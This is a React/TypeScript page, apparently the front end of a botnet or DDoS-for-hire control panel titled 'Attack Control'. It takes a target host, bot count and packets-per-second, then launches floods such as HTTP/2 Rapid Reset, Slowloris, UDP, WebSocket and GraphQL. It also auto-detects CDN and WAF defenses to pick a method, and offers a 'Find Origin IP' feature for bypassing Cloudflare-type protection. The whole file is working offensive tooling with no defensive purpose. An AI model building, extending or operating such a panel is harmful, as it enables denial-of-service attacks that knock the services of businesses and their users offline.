import React, { useEffect, useState } from 'react';
import { api } from '../utils/api';
import { Crosshair, StopCircle, Zap, AlertTriangle, Clock, Target, Sparkles, Settings2, Loader2, Search, Globe, Server, ShieldCheck } from 'lucide-react';
import { useToast } from '../components/Toast';

interface Attack {
  id: string; target_host: string; target_port: number; method: string;
  duration_secs: number; pps_per_bot: number; spoof_mode: number;
  fragmentation: boolean; mega_mode: boolean; status: string;
  bot_ids: string[]; total_packets: number; started_at: string | null;
}

const METHODS = [
  { id: 'MEGA', desc: 'TCP+TLS connection flood', cat: 'TCP' },
  { id: 'TLS_EXHAUST', desc: 'TCP+TLS (alias MEGA)', cat: 'TCP' },
  { id: 'H2RAPID', desc: 'HTTP/2 Rapid Reset (CVE-2023-44487)', cat: 'L7' },
  { id: 'WSFLOOD', desc: 'WebSocket flood (512 conns)', cat: 'L7' },
  { id: 'GRAPHQL', desc: 'GraphQL deeply nested query', cat: 'L7' },
  { id: 'GAME', desc: 'NRO game socket login spam', cat: 'L7' },
  { id: 'HTTP_PROXY', desc: 'HTTP via proxy (IP rotation)', cat: 'L7' },
  { id: 'HTTP', desc: 'HTTP keep-alive pool', cat: 'L7' },
  { id: 'SLOWLORIS', desc: 'Slowloris drip (512 conns)', cat: 'L7' },
  { id: 'UDP', desc: 'UDP volumetric flood', cat: 'L3/L4' },
];

const DEFENSE_LABELS: Record<string, { label: string; color: string }> = {
  cloudflare: { label: 'Cloudflare', color: 'text-orange-400' },
  akamai: { label: 'Akamai', color: 'text-blue-400' },
  aws_waf: { label: 'AWS WAF', color: 'text-yellow-400' },
  nginx_only: { label: 'Nginx (no CDN)', color: 'text-emerald-400' },
  apache_only: { label: 'Apache (no CDN)', color: 'text-emerald-400' },
  no_protection: { label: 'No Protection', color: 'text-emerald-400' },
};

export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
  const { toast } = useToast();
  const [attacks, setAttacks] = useState<Attack[]>([]);
  const [form, setForm] = useState({
    target_host: '', target_port: 443, method: 'MEGA', duration_secs: 60,
    pps_per_bot: 100000, bot_count: 1, mega_mode: false,
    payload: '', proxies: '',
  });

  /** Parse https://domain.com or http://ip:8080 → host + port */
  const parseTarget = (raw: string) => {
    let host = raw.trim();
    let port = form.target_port;
    let scheme = '';
    if (/^https:\/\//i.test(host)) { scheme = 'https'; host = host.replace(/^https:\/\//i, ''); }
    else if (/^http:\/\//i.test(host)) { scheme = 'http'; host = host.replace(/^http:\/\//i, ''); }
    host = host.replace(/\/.*$/, ''); // strip path
    const m = host.match(/^(.+):(\d+)$/);
    if (m) { host = m[1]; port = parseInt(m[2], 10); }
    else if (scheme === 'https') port = 443;
    else if (scheme === 'http') port = 80;
    return { host, port };
  };
  const [launching, setLaunching] = useState(false);
  const [detecting, setDetecting] = useState(false);
  const [err, setErr] = useState('');
  const [history, setHistory] = useState<Attack[]>([]);
  const [autoMode, setAutoMode] = useState(true);
  const [detectResult, setDetectResult] = useState<any>(null);
  const [originResult, setOriginResult] = useState<any>(null);
  const [originLoading, setOriginLoading] = useState(false);

  const fetchActive = async () => {
    try {
      const { data } = await api.get('/api/attacks/active');
      setAttacks(Array.isArray(data) ? data : data?.items || []);
    } catch { /* ignore poll errors */ }
  };

  const fetchHistory = async () => {
    try {
      const { data } = await api.get('/api/attacks/mine');
      setHistory(Array.isArray(data) ? data : data?.items || []);
    } catch { /* ignore */ }
  };

  useEffect(() => {
    fetchActive();
    fetchHistory();
    const i = setInterval(() => {
      if (!document.hidden) fetchActive();
    }, 3000);
    return () => clearInterval(i);
  }, []);

  const detect = async () => {
    if (!form.target_host.trim()) { setErr('Target host is required'); return; }
    setDetecting(true);
    setErr('');
    try {
      const { data } = await api.post('/api/attacks/detect', {
        target_host: form.target_host,
        target_port: form.target_port,
      });
      setDetectResult(data);
      toast(`Detected: ${DEFENSE_LABELS[data.defense_type]?.label || data.defense_type} → ${data.best_method}`, 'success');
    } catch (e: any) {
      setErr('Detection failed: ' + (e.response?.data?.detail || e.message));
    }
    setDetecting(false);
  };

  const launch = async () => {
    if (!form.target_host.trim()) { setErr('Target host is required'); return; }
    setLaunching(true);
    setErr('');
    try {
      const parsed = parseTarget(form.target_host);
      const host = parsed.host;
      const port = form.target_port || parsed.port;
      let method = form.method;
      let pps = form.pps_per_bot;

      // AUTO mode: detect defense first, then auto-select method
      if (autoMode) {
        if (!detectResult) {
          const { data } = await api.post('/api/attacks/detect', {
            target_host: host,
            target_port: port,
          });
          setDetectResult(data);
          method = data.best_method;
        } else {
          method = detectResult.best_method;
        }
        if (detectResult?.defense_type === 'cloudflare' || detectResult?.defense_type === 'akamai') {
          pps = Math.min(pps, 50000);
        }
      }

      const payload = {
        ...form,
        target_host: host,
        target_port: port,
        method,
        pps_per_bot: pps,
        mega_mode: method === 'MEGA',
        slowloris: method === 'SLOWLORIS',
        tls_exhaust: method === 'TLS_EXHAUST',
      };
      await api.post('/api/attacks/launch', payload);
      toast(`Attack launched → ${form.target_host}:${form.target_port} [${method}]`, 'success');
      fetchActive();
      fetchHistory();
    } catch (e: any) {
      const msg = e.response?.data?.detail || e.message || 'Launch failed';
      setErr(typeof msg === 'string' ? msg : JSON.stringify(msg));
      toast(typeof msg === 'string' ? msg : 'Launch failed', 'error');
    }
    setLaunching(false);
  };

  const stop = async (id: string) => {
    try { await api.post(`/api/attacks/${id}/stop`); toast('Attack stopped', 'success'); fetchActive(); }
    catch { toast('Stop failed', 'error'); }
  };

  const elapsed = (started: string | null, duration: number) => {
    if (!started) return '—';
    const sec = Math.floor((Date.now() - new Date(started).getTime()) / 1000);
    return `${Math.min(sec, duration)}s / ${duration}s`;
  };

  const input = "w-full bg-[var(--bg-primary)] border border-[var(--border)] rounded-xl px-4 py-2.5 text-sm focus:outline-none focus:border-emerald-600 transition-colors";
  const label = "text-xs font-semibold text-[var(--text-secondary)] uppercase tracking-wider block mb-2";

  return (
    <div className="p-6 md:p-8 animate-fade-in max-w-6xl">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6">
        <div>
          <h2 className="text-2xl font-bold">Attack Control</h2>
          <p className="text-sm text-[var(--text-muted)] mt-1">Launch and manage attacks</p>
        </div>
        {/* AUTO / MANUAL toggle */}
        <div className="flex items-center gap-1 p-1 bg-[var(--bg-secondary)] border border-[var(--border)] rounded-xl">
          <button
            onClick={() => setAutoMode(true)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${autoMode ? 'bg-emerald-600 text-white' : 'text-[var(--text-muted)] hover:text-[var(--text-primary)]'}`}
          >
            <Sparkles className="w-3.5 h-3.5" /> AUTO
          </button>
          <button
            onClick={() => setAutoMode(false)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${!autoMode ? 'bg-emerald-600 text-white' : 'text-[var(--text-muted)] hover:text-[var(--text-primary)]'}`}
          >
            <Settings2 className="w-3.5 h-3.5" /> MANUAL
          </button>
        </div>
      </div>

      {/* Launch form */}
      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl p-6 mb-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
          <div>
            <label className={label}>Target Host</label>
            <div className="relative">
              <Target className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[var(--text-muted)]" />
              <input
                className={`${input} pl-10`}
                placeholder="https://example.com  hoặc  1.2.3.4:443"
                value={form.target_host}
                onChange={e => {
                  const v = e.target.value;
                  setForm(f => {
                    const p = parseTarget(v);
                    // keep raw display if user still typing scheme; on blur we normalize
                    return { ...f, target_host: v, target_port: /:\/\//.test(v) || /:\d+$/.test(v) ? p.port : f.target_port };
                  });
                  setDetectResult(null);
                  setOriginResult(null);
                }}
                onBlur={() => {
                  const p = parseTarget(form.target_host);
                  setForm(f => ({ ...f, target_host: p.host, target_port: p.port }));
                }}
              />
              <p className="text-[10px] text-[var(--text-muted)] mt-1">Web: https://domain.com → port 443 · VPS IP mới scan port</p>
            </div>
          </div>
          <div>
            <label className={label}>Port</label>
            <input type="number" className={input} value={form.target_port} onChange={e => { setForm(f => ({ ...f, target_port: +e.target.value })); setDetectResult(null); }} />
          </div>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-4">
          <div>
            <label className={label}>Duration (s)</label>
            <input type="number" className={input} value={form.duration_secs} onChange={e => setForm(f => ({ ...f, duration_secs: +e.target.value }))} />
          </div>
          <div>
            <label className={label}>PPS/Bot</label>
            <input type="number" className={input} value={form.pps_per_bot} onChange={e => setForm(f => ({ ...f, pps_per_bot: +e.target.value }))} />
          </div>
          <div>
            <label className={label}>Bots</label>
            <input type="number" className={input} value={form.bot_count} onChange={e => setForm(f => ({ ...f, bot_count: +e.target.value }))} />
          </div>
          <div className="flex items-end">
            {/* Detect button (AUTO mode) */}
            {autoMode && (
              <button onClick={detect} disabled={detecting || !form.target_host.trim()} className="flex items-center gap-2 px-4 py-2.5 bg-blue-600/10 border border-blue-600/20 hover:bg-blue-600/20 disabled:opacity-40 rounded-xl text-xs font-medium text-blue-400 transition-colors w-full justify-center">
                {detecting ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Sparkles className="w-3.5 h-3.5" />}
                {detecting ? 'Scanning...' : 'Scan Target'}
              </button>
            )}
          </div>
        </div>

        {/* Detection result (AUTO mode) */}
        {autoMode && detectResult && (
          <div className="mb-4 p-4 bg-blue-600/5 border border-blue-600/15 rounded-xl">
            <div className="flex items-center gap-2 mb-2">
              <span className="text-xs font-semibold text-blue-400">Defense Analysis</span>
              <span className={`text-xs font-bold ${DEFENSE_LABELS[detectResult.defense_type]?.color || 'text-emerald-400'}`}>
                {DEFENSE_LABELS[detectResult.defense_type]?.label || detectResult.defense_type}
              </span>
            </div>
            <p className="text-[11px] text-[var(--text-muted)] mb-3">{detectResult.reason}</p>
            <div className="flex items-center gap-2">
              <span className="text-[11px] text-[var(--text-secondary)]">Auto-selected:</span>
              <span className="px-2.5 py-0.5 rounded-full text-[10px] font-bold bg-emerald-600/15 border border-emerald-600/30 text-emerald-400">{detectResult.best_method}</span>
            </div>
            {/* Method scores */}
            <div className="flex flex-wrap gap-1.5 mt-3">
              {Object.entries(detectResult.method_scores || {}).slice(0, 5).map(([m, s]: any) => (
                <span key={m} className={`px-1.5 py-0.5 rounded text-[9px] font-mono border ${s >= 7 ? 'bg-emerald-600/10 border-emerald-600/20 text-emerald-400' : s >= 4 ? 'bg-yellow-600/10 border-yellow-600/20 text-yellow-400' : 'bg-red-600/10 border-red-600/20 text-red-400'}`}>
                  {m} {s}/10
                </span>
              ))}
            </div>
          </div>
        )}

        {/* Origin IP Discovery */}
        <div className="mb-4 flex items-center gap-2">
          <button
            onClick={async () => {
              if (!form.target_host.trim()) { setErr('Target host is required'); return; }
              setOriginLoading(true); setErr('');
              try {
                const { data } = await api.post('/api/attacks/origin-discover', { domain: form.target_host.replace(/^https?:\/\//, '').split('/')[0] });
                setOriginResult(data);
                if (data.confirmed_origin_ips?.length > 0) {
                  toast(`Found ${data.confirmed_origin_ips.length} confirmed origin IP(s)!`, 'success');
                } else if (data.likely_origin_ips?.length > 0) {
                  toast(`${data.likely_origin_ips.length} likely origin IPs found`, 'success');
                } else {
                  toast('No origin IP found (target may not use CDN)', 'info');
                }
              } catch (e: any) { setErr('Origin discovery failed: ' + (e.response?.data?.detail || e.message)); }
              setOriginLoading(false);
            }}
            disabled={originLoading || !form.target_host.trim()}
            className="flex items-center gap-2 px-4 py-2.5 bg-purple-600/10 border border-purple-600/20 hover:bg-purple-600/20 disabled:opacity-40 rounded-xl text-xs font-medium text-purple-400 transition-colors"
          >
            {originLoading ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Search className="w-3.5 h-3.5" />}
            {originLoading ? 'Discovering...' : 'Find Origin IP'}
          </button>
          <span className="text-[10px] text-[var(--text-muted)]">Bypass CDN/WAF by finding real server IP</span>
        </div>

        {/* Origin IP results */}
        {originResult && (
          <div className="mb-4 p-4 bg-purple-600/5 border border-purple-600/15 rounded-xl">
            <div className="flex items-center gap-2 mb-3">
              <Server className="w-4 h-4 text-purple-400" />
              <span className="text-xs font-semibold text-purple-400">Origin IP Discovery</span>
              <span className="text-[10px] text-[var(--text-muted)]">CDN detected: {originResult.cdn_detected ? 'Yes' : 'No'}</span>
            </div>

            {/* Confirmed IPs */}
            {originResult.confirmed_origin_ips?.length > 0 && (
              <div className="mb-3">
                <div className="flex items-center gap-1.5 mb-2">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
                  <span className="text-[11px] font-bold text-emerald-400">CONFIRMED Origin IPs</span>
                </div>
                {originResult.confirmed_origin_ips.map((ip: any, i: number) => (
                  <div key={i} className="flex items-center gap-3 mb-1.5 p-2 bg-emerald-600/5 border border-emerald-600/15 rounded-lg">
                    <span className="text-xs font-mono font-bold text-emerald-400">{ip.ip}</span>
                    {ip.server && <span className="text-[10px] text-[var(--text-muted)]">{ip.server}</span>}
                    {ip.title && <span className="text-[10px] text-[var(--text-muted)]">{ip.title}</span>}
                    <button
                      onClick={() => { setForm(f => ({ ...f, target_host: ip.ip })); setOriginResult(null); }}
                      className="ml-auto px-2 py-1 text-[10px] bg-emerald-600/15 border border-emerald-600/30 rounded text-emerald-400 hover:bg-emerald-600/25 transition-colors"
                    >
                      Use This IP →
                    </button>
                  </div>
                ))}
              </div>
            )}

            {/* Likely IPs */}
            {originResult.likely_origin_ips?.length > 0 && (
              <div>
                <div className="flex items-center gap-1.5 mb-2">
                  <Globe className="w-3.5 h-3.5 text-yellow-400" />
                  <span className="text-[11px] font-bold text-yellow-400">Likely Origin IPs</span>
                </div>
                <div className="space-y-1">
                  {originResult.likely_origin_ips.map((ip: any, i: number) => (
                    <div key={i} className="flex items-center gap-3 p-1.5 bg-yellow-600/5 border border-yellow-600/15 rounded-lg">
                      <span className="text-xs font-mono text-yellow-400">{ip.ip}</span>
                      {ip.subdomain && <span className="text-[10px] text-[var(--text-muted)]">{ip.subdomain}</span>}
                      <span className="text-[10px] text-[var(--text-muted)]">{ip.source}</span>
                      <button
                        onClick={() => { setForm(f => ({ ...f, target_host: ip.ip })); setOriginResult(null); }}
                        className="ml-auto px-2 py-0.5 text-[10px] bg-yellow-600/10 border border-yellow-600/20 rounded text-yellow-400 hover:bg-yellow-600/20 transition-colors"
                      >
                        Use →
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {originResult.confirmed_origin_ips?.length === 0 && originResult.likely_origin_ips?.length === 0 && (
              <p className="text-xs text-[var(--text-muted)]">No origin IPs found. Target may not use CDN, or is well-protected.</p>
            )}
          </div>
        )}

        {/* Manual method selection */}
        {!autoMode && (
          <div className="mb-4">
            <label className={label}>Method</label>
            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-2">
              {METHODS.map(m => (
                <button
                  key={m.id}
                  onClick={() => setForm(f => ({ ...f, method: m.id }))}
                  className={`p-3 rounded-xl border text-left transition-all ${form.method === m.id ? 'bg-emerald-600/15 border-emerald-600/40' : 'bg-[var(--bg-primary)] border-[var(--border)] hover:border-[var(--text-muted)]'}`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <span className={`text-[10px] font-bold ${form.method === m.id ? 'text-emerald-400' : 'text-[var(--text-secondary)]'}`}>{m.id}</span>
                    <span className="text-[8px] text-[var(--text-muted)] uppercase">{m.cat}</span>
                  </div>
                  <p className="text-[10px] text-[var(--text-muted)] leading-tight">{m.desc}</p>
                </button>
              ))}
            </div>
          </div>
        )}

        {/* Advanced fields for specific methods */}
        {form.method === 'GAME' && !autoMode && (
          <div className="mb-4">
            <label className={label}>Game Payload (base64) — empty = auto-craft NRO login</label>
            <textarea rows={2} placeholder="Leave empty for auto-crafted NRO login packet..." className={`${input} font-mono text-xs`} value={form.payload} onChange={e => setForm(f => ({ ...f, payload: e.target.value }))} />
          </div>
        )}
        {form.method === 'HTTP_PROXY' && !autoMode && (
          <div className="mb-4">
            <label className={label}>Proxy List (optional — auto-fetch if empty)</label>
            <textarea rows={2} placeholder="Leave empty for auto-fetch free proxies..." className={`${input} font-mono text-xs`} value={form.proxies} onChange={e => setForm(f => ({ ...f, proxies: e.target.value }))} />
          </div>
        )}

        {err && (
          <div className="mb-4 p-3 bg-red-600/5 border border-red-600/15 rounded-xl flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 text-red-400 flex-shrink-0" />
            <p className="text-xs text-red-400">{err}</p>
          </div>
        )}

        <button onClick={launch} disabled={launching} className="w-full flex items-center justify-center gap-2 px-6 py-4 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 disabled:opacity-40 disabled:cursor-not-allowed rounded-2xl text-sm font-bold transition-all shadow-lg shadow-emerald-600/20">
          {launching ? <Loader2 className="w-5 h-5 animate-spin" /> : <Crosshair className="w-5 h-5" />}
          {launching ? 'Launching...' : autoMode ? 'Auto-Launch Attack' : 'Launch Attack'}
        </button>
      </div>

      {/* Active attacks */}
      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl overflow-hidden mb-6">
        <div className="px-6 py-4 border-b border-[var(--border)]">
          <h3 className="text-sm font-semibold flex items-center gap-2">
            <Zap className="w-4 h-4 text-yellow-400" /> Active Attacks
          </h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full min-w-[800px]">
            <thead className="bg-[var(--bg-primary)]/50">
              <tr>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Target</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Method</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Progress</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Packets</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Started</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Action</th>
              </tr>
            </thead>
            <tbody>
              {attacks.length === 0 ? (
                <tr><td colSpan={6} className="p-12 text-center text-[var(--text-muted)] text-xs">No active attacks</td></tr>
              ) : attacks.map(a => (
                <tr key={a.id} className="border-b border-[var(--border)]/50 hover:bg-[var(--bg-hover)]/50">
                  <td className="p-4 text-xs font-mono">{a.target_host}:{a.target_port}</td>
                  <td className="p-4"><span className="px-2 py-0.5 rounded text-[10px] font-medium bg-red-600/10 text-red-400 border border-red-600/20">{a.method}</span></td>
                  <td className="p-4 text-xs text-[var(--text-secondary)] tabular-nums">{elapsed(a.started_at, a.duration_secs)}</td>
                  <td className="p-4 text-xs font-mono text-[var(--text-secondary)] tabular-nums">{(a.total_packets || 0).toLocaleString()}</td>
                  <td className="p-4 text-xs text-[var(--text-muted)]">{a.started_at ? new Date(a.started_at).toLocaleTimeString() : '—'}</td>
                  <td className="p-4">
                    <button onClick={() => stop(a.id)} className="p-2 hover:bg-red-600/10 rounded-lg text-red-400 transition-colors" title="Stop">
                      <StopCircle className="w-3.5 h-3.5" />
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Attack History */}
      <div className="bg-[var(--bg-secondary)] border border-[var(--border)] rounded-2xl overflow-hidden">
        <div className="px-6 py-4 border-b border-[var(--border)]">
          <h3 className="text-sm font-semibold flex items-center gap-2">
            <Clock className="w-4 h-4 text-[var(--text-muted)]" /> Attack History
          </h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-[var(--bg-primary)]/50">
              <tr>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Target</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Method</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Status</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Packets</th>
                <th className="p-4 text-left text-[10px] font-semibold uppercase text-[var(--text-muted)]">Started</th>
              </tr>
            </thead>
            <tbody>
              {history.length === 0 ? (
                <tr><td colSpan={5} className="p-8 text-center text-[var(--text-muted)] text-xs">No attack history</td></tr>
              ) : history.slice(0, 20).map(a => (
                <tr key={a.id} className="border-b border-[var(--border)]/50">
                  <td className="p-4 text-xs font-mono">{a.target_host}:{a.target_port}</td>
                  <td className="p-4"><span className="px-2 py-0.5 rounded text-[10px] font-medium bg-[var(--bg-primary)] border border-[var(--border)] text-[var(--text-secondary)]">{a.method}</span></td>
                  <td className="p-4 text-xs">{a.status || '—'}</td>
                  <td className="p-4 text-xs font-mono text-[var(--text-secondary)]">{(a.total_packets || 0).toLocaleString()}</td>
                  <td className="p-4 text-xs text-[var(--text-muted)]">{a.started_at ? new Date(a.started_at).toLocaleString() : '—'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
